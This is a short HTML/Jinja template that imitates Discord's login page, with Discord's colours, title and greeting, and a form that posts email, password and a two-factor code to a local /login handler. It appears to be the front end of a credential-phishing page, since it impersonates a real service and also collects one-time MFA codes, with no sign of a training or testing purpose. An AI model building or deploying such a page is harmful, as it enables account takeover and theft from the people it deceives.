<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login - Discord</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #36393f;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-box {
      background: #2f3136;
      padding: 20px;
      border-radius: 8px;
      width: 300px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      background: #202225;
      border: none;
      border-radius: 4px;
      color: white;
    }
    button {
      background: #5865f2;
      color: white;
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    .error {
      color: #f04747;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <form method="POST" action="/login">
    <div class="login-box">
      <h3>Welcome back!</h3>
      <p>We're so excited to see you again!</p>
      <input name="email" type="text" placeholder="Email or Phone Number" required />
      <input name="password" type="password" placeholder="Password" required />
      <input name="mfa" type="text" placeholder="2FA Code (if any)" />
      <button type="submit">Login</button>
      {% if error %}
      <p class="error">{{ error }}</p>
      {% endif %}
    </div>
  </form>
</body>
</html>
